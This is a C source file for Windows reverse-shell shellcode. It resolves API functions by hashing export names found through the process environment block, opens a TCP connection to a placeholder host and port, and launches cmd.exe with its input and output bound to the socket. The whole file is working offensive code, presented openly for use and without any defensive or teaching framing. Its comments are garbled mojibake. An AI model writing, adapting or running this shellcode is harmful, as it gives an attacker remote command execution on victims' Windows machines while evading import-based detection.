//�򵥵ķ�������shell shellcode(2015)

#include <WinSock2.h>   //����ŵ�#include <windows.h>,��Ȼ����뱨��
#include <WS2tcpip.h>
#include <windows.h>
//#include <winnt.h>
#include <winternl.h>
#include <stddef.h>
//#include <stdio.h>

#define htons(A) ((((WORD)(A) & 0xff00) >> 8) | (((WORD)(A) & 0x00ff) << 8))

_inline PEB *getPEB()
{
       PEB *p;

       __asm{
              mov eax,fs:[30h]
              mov p,eax
       }

       return p;
}
           
DWORD getHash(const char* str)
{      
       DWORD h = 0;

       while (*str)
       {
              h = (h >> 13) | (h << (32 - 13));    //ROR h,13
              h += *str >= 'a' ? *str - 32 : *str;   //���ַ�ת��Ϊ��д
              str++;
       }

       return h;
}
     
DWORD getFunctionHash(const char* moduleName, const char* functionName)
{
       return getHash(moduleName) + getHash(functionName);
}

LDR_DATA_TABLE_ENTRY * getDataTableEntry(const LIST_ENTRY* ptr)
{
       int list_entry_offset = offsetof(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
       return (LDR_DATA_TABLE_ENTRY*)((BYTE*)ptr - list_entry_offset);
}

//ע��:��������Դ��������Ч.����,kernel32.ExitThreadʵ������ntdll.RtlExitUserThread�Ĵ������.
//���������Ҫ�ֶ���λ��������õĺ���.
PVOID getProcAddrByHash(DWORD hash)
{      
       PEB* peb = getPEB();
       LIST_ENTRY* first = peb->Ldr->InMemoryOrderModuleList.Flink;
       LIST_ENTRY* ptr = first;

       do 
       {
              LDR_DATA_TABLE_ENTRY* dte = getDataTableEntry(ptr);
              ptr = ptr->Flink;
 
              BYTE* baseAddress = (BYTE*)dte->DllBase;

              if (!baseAddress)   //��Чģ��(???)
                     continue;

              IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)baseAddress;
              IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(baseAddress + dosHeader->e_lfanew);
              DWORD iedRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;

              if (!iedRVA)    //����Ŀ¼������
                     continue;

              IMAGE_EXPORT_DIRECTORY* ied = (IMAGE_EXPORT_DIRECTORY*)(baseAddress + iedRVA);
			  char* moduleName = (char*)(baseAddress + ied->Name);
              DWORD moduleHash = getHash(moduleName);

              //�������Ƶ�ַ��(AddressOfNames)�ͺ�����ŵ�ַ��(AddressOfNameOrdinals)�е�Ԫ��ָ��
              //��ͬ�ĺ���.AddressOfNamesָ���˺��������ַ�����ָ������,��AddressOfNameOrdinalsָ���˸ú�����AddressOfFunctions��
              //����ֵ.

              DWORD* nameRVAs = (DWORD*)(baseAddress + ied->AddressOfNames);
              for (DWORD i = 0; i < ied->NumberOfNames; ++i)
              {
                     char* functionName = (char*)(baseAddress + nameRVAs[i]);
                     if (hash == moduleHash + getHash(functionName))
                     {
                            WORD ordinal = ((WORD*)(baseAddress + ied->AddressOfNameOrdinals))[i];
                            DWORD functionRVA = ((DWORD*)(baseAddress + ied->AddressOfFunctions))[ordinal];
                            return baseAddress + functionRVA;
                     }
              }
       } while (ptr != first);

       return NULL;  //��ַû�ҵ�
}

 

#define HASH_LoadLibraryA 0xf8b7108d

#define HASH_WSAStartup 0x2ddcd540

#define HASH_WSACleanup 0x0b9d13bc

#define HASH_WSASocketA 0x9fd4f16f

#define HASH_WSAConnect 0xa50da182

#define  HASH_CreateProcessA 0x231cbe70

#define  HASH_inet_ntoa 0x1b73fed1

#define  HASH_inet_addr 0x011bfae2

#define  HASH_getaddrinfo 0xdc2953c9

#define  HASH_getnameinfo 0x5c1c856e

#define HASH_ExitThread 0x4b3153e0

#define  HASH_WaitForSingleObject 0xca8e9498

 
#define DefineFuncPtr(name) decltype(name) *My_##name=(decltype(name)*)getProcAddrByHash(HASH_##name);

int entryPoint()
{
              //printf("0x%08x\n",getFunctionHash("kernel32.dll","WaitForSingleObject"));
           //return 0;

              //ע��:������Ҫ����WSACleanup()��freeaddrinfo()(��getaddrinfo()֮��),
           //��Ҳ��һ����Ҫ

              DefineFuncPtr(LoadLibraryA);

              My_LoadLibraryA("ws2_32.dll");

              DefineFuncPtr(WSAStartup);

              DefineFuncPtr(WSASocketA);

              DefineFuncPtr(WSAConnect);

              DefineFuncPtr(CreateProcessA);

              DefineFuncPtr(inet_ntoa);

              DefineFuncPtr(inet_addr);

              DefineFuncPtr(getaddrinfo);

              DefineFuncPtr(getnameinfo);

              DefineFuncPtr(ExitThread);

              DefineFuncPtr(WaitForSingleObject);

              const char* hostName = "127.0.0.1";
              const int hostPort = 123;
              WSADATA wsaData;

              if (My_WSAStartup(MAKEWORD(2, 2), &wsaData))
                     goto __end;     //����

              SOCKET sock = My_WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP,NULL,0,0);

              if (sock == INVALID_SOCKET)
                     goto __end;

              addrinfo* result;
              if (My_getaddrinfo(hostName, NULL, NULL, &result))
                     goto __end;

              char ip_addr[16];
              My_getnameinfo(result->ai_addr, result->ai_addrlen, ip_addr, sizeof(ip_addr), NULL, 0, NI_NUMERICHOST);

              SOCKADDR_IN remoteAddr;
              remoteAddr.sin_family = AF_INET;
              remoteAddr.sin_port = htons(hostPort);
              remoteAddr.sin_addr.s_addr = My_inet_addr(ip_addr);
 
              if (My_WSAConnect(sock, (SOCKADDR*)&remoteAddr, sizeof(remoteAddr), NULL, NULL, NULL, NULL))
                     goto __end;

              
              STARTUPINFOA sInfo;
              PROCESS_INFORMATION procInfo;
              SecureZeroMemory(&sInfo, sizeof(sInfo));   //�������_memset
              sInfo.cb = sizeof(sInfo);
              sInfo.dwFlags = STARTF_USESTDHANDLES;
              sInfo.hStdInput = sInfo.hStdOutput = sInfo.hStdError = (HANDLE)sock;
              My_CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &sInfo, &procInfo);

              //�ȴ����̽���
              My_WaitForSingleObject(procInfo.hProcess, INFINITE);
       __end:
              My_ExitThread(0);

              return 0;
}

 

int main()
{      
       return entryPoint();
}
